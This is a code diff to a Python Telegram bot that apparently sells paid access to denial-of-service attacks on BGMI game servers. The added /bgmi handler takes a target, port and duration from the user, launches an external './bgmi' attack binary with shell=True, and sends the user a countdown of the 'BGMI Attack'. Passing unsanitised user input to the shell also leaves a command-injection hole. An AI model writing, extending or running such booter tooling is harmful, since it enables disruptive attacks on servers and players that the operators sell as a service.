@@ -4,6 +4,20 @@ import telebot
 import subprocess
 import datetime
 import os
+import time
+import threading
+
+from requests.exceptions import Timeout
+def send_message_with_retry(chat_id, text):
+    for attempt in range(3):  # Try 3 times
+        try:
+            bot.send_message(chat_id, text)
+            break  # If successful, exit the loop
+        except Timeout:
+            if attempt < 2:  # If it's not the last attempt
+                time.sleep(2)  # Wait before retrying
+            else:
+                print("Failed to send message after multiple attempts.")
 
 from keep_alive import keep_alive
 keep_alive()
@@ -323,6 +337,45 @@ def handle_bgmi(message):
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
 
     bot.reply_to(message, response)
+
+
+  # To run the countdown without blocking the bot
+
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    user_id = message.from_user.id
+    allowed_user_ids = read_users()
+    
+    if user_id in allowed_user_ids:
+        # Parse the command for target, port, and time
+        command_args = message.text.split()[1:]
+        if len(command_args) != 3:
+            bot.reply_to(message, "Please provide target, port, and time in this format: /bgmi <target> <port> <time>")
+            return
+
+        target, port, time_to_attack = command_args
+        try:
+            time_to_attack = int(time_to_attack)
+        except ValueError:
+            bot.reply_to(message, "Time must be a number.")
+            return
+        
+        bot.reply_to(message, f"BGMI Attack started on Target: {target}, Port: {port}, Time: {time_to_attack} seconds.")
+
+        # Start the attack in a subprocess
+        full_command = f"./bgmi {target} {port} {time_to_attack} 110"
+        subprocess.Popen(full_command, shell=True)  # Non-blocking call so we can handle countdown
+
+        # Start countdown in a separate thread to avoid blocking the bot
+        def countdown_timer():
+            for remaining_time in range(time_to_attack, 0, -1):
+                time.sleep(1)  # Wait for 1 second
+                bot.send_message(user_id, f"⏳ {remaining_time} seconds remaining for the BGMI attack on {target}.")
+            
+            bot.send_message(user_id, "✅ BGMI Attack finished successfully.")
+        
+        # Run the countdown in a separate thread
+        threading.Thread(target=countdown_timer).start()
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
